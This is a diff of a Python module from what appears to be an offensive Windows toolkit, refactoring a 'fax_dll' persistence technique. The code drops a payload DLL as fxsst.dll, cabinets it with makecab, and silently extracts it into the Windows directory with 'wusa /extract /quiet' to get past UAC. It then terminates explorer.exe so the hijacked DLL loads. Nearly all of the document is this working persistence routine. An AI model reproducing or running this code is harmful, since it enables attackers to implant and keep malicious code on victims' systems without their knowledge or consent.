@@ -1,135 +1,81 @@
 import os
-import wmi
 import time
 import tempfile
 from core.prints import *
+from core.utils import *
 
-wmi = wmi.WMI()
-
-def windows_directory():
-	"""
-	Get Windows directory
-	"""
-	try:
-		for os in wmi.Win32_OperatingSystem():
-			return os.WindowsDirectory
-	except Exception as error:
-		return False
-
-def restart_explorer():
-	"""
-	Once the DLL is dropped we can either wait for a reboot
-	or just kill the process, the process should auto-restart
-	and after a while the DLL gets loaded
-	"""
-	try:
-		for process in wmi.Win32_Process():
-			if (process.Caption == "explorer.exe"):
-				process.Terminate(process.ParentProcessId)
-	except Exception as error:
-		return False
+explorer_info = {
+        "Description": "Gain persistence using explorer and dll hijacking",
+		"Id" : "15",
+		"Type" : "Persistence",
+		"Fixed In" : "9800",
+		"Works From" : "7600",
+		"Admin" : False,
+		"Function Name" : "fax_dll",
+		"Function Payload" : True,
+    }
 
 def fax_dll(payload):
-	print """
- -------------------------------------------------------------
- Persistence technique using dll hijacking, once explorer.exe
- starts it attempts to load fxsst.dll if the DLL is present
- in the Windows directory. The DLL needs to call LoadLibrary
- on itself, otherwise explorer.exe will crash.
- 
- When everything worked correctly, we should gain persistence
- -------------------------------------------------------------
- """
- 
-	"""
-	Save the DLL file to temp directory
-	"""
-	print_info("Payload: {}".format(payload))
-	print_info("Attempting to read payload data")
 	if (os.path.isfile(os.path.join(payload)) == True):
 		try:
 			payload_data = open(os.path.join(payload),"rb").read()			
 		except Exception as error:
-			print_error("Unable to read payload data")
 			return False
-		else:
-			print_success("Successfully read payload data")
 		
-		print_info("Attempting to save payload to: {}".format(tempfile.gettempdir()))
 		try:
 			dll_file = open(os.path.join(tempfile.gettempdir(),"fxsst.dll"),"wb")
 			dll_file.write(payload_data)
 			dll_file.close()			
 		except Exception as error:
-			print_error("Unable to save payload to disk")
 			return False
 		else:
-			print_success("Successfully saved payload in: {}".format(tempfile.gettempdir()))
+			pass
+
+	time.sleep(5)
 	
-	print_info("Pausing for 5 seconds before creating cabinet file")
+	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"fxsst.dll")) == True):
+		if process().create("cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"fxsst.dll"),os.path.join(tempfile.gettempdir(),"suspicious.cab")),0) == True:
+			print_success("Successfully created cabinet file")
+		else:
+			print_success("Unable to create cabinet file")
+			return False
+	else:
+		print_error("Unable to create cabinet file, dll file is not found")
+		return False
+
 	time.sleep(5)
 
-	"""
-	Create a cabinet file that we can use later for
-	the DLL drop
-	"""
-	print_info("Attempting to create cabinet file")
-	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"fxsst.dll")) == True):
-		makecab = wmi.Win32_Process.Create(CommandLine="cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"fxsst.dll"),
-							os.path.join(tempfile.gettempdir(),"suspicious.cab")),
-							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
-		
-		time.sleep(5)
+	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
+		if process().create("cmd.exe /c wusa {} /extract:{} /quiet".format(os.path.join(tempfile.gettempdir(),"suspicious.cab"),information().windows_directory()),0) == True:
+			print_success("Successfully extracted cabinet file")
+		else:
+			print_error("Unable to extract cabinet file")	
+			return False
+	else:
+		print_error("Unable to extract cabinet file, cabinet file is not found")
+		return False
 
-		if (makecab[1] == 0):
-			print_success("Successfully created cabinet file in: {}".format(tempfile.gettempdir()))
+	if (os.path.isfile(os.path.join(information().windows_directory(),"fxsst.dll")) == True):
+		print_success("Successfully installed persistence")
+		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
+			try:
+				os.remove(os.path.join(tempfile.gettempdir(),"suspicious.cab"))				
+			except Exception as error:
+				return False
+		else:
+			pass
+		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"fxsst.dll")) == True):
 			try:
 				os.remove(os.path.join(tempfile.gettempdir(),"fxsst.dll"))
 			except Exception as error:
 				return False
 		else:
-			print_error("Unable to create cabinet file")
-			return False
-	else:
-		print_error("Unable to create cabinet file, the payload is not present in: {}".format(tempfile.gettempdir()))
-		return False
-	
-	print_info("Pausing for 5 seconds before extracting the cabinet file")
-	time.sleep(5)
-
-	"""
-	We use the built-in feature wusa to extract our DLL file
-	into UAC protected folders, this feature was removed in
-	Windows 10
-	"""
-	print_info("Attempting to extract the cabinet file")
-	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
-		wusa = wmi.Win32_Process.Create(CommandLine="cmd.exe /c wusa {} /extract:{} /quiet".format(os.path.join(tempfile.gettempdir(),"suspicious.cab"),windows_directory()),
-							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+			pass
 		
-		time.sleep(5)
-
-		if (wusa[1] == 0):
-			print_success("Successfully extracted cabinet file")
-			try:
-				os.remove(os.path.join(tempfile.gettempdir(),"suspicious.cab"))
-			except Exception as error:
-				return False
+		print_info("Attempting to restart explorer in order to load our dll file")
+		if (process().terminate("explorer.exe") == True):
+			print_success("Successfully restarted explorer process, enjoy!")
 		else:
-			print_error("Unable to extract cabinet file")
-			return False
+			print_success("Unable to restart explorer process, reboot!")
 	else:
-		print_error("Unable to extract cabinet file, the cabinet file is not present in: {}".format(tempfile.gettempdir()))
-		return False
-		
-	"""	
-	Check if our DLL file is present in the Windows directory
-	"""
-	if (os.path.isfile(os.path.join(windows_directory(),"fxsst.dll")) == True):
-		if (restart_explorer() == None):
-			print_success("We should now have persistence on system")
-		else:
-			print_warning("Unable to restart explorer process, we get persistence once the system reboots")
-	else:
-		print_error("Unable to get persistence on system, file copy failed")
 		return False
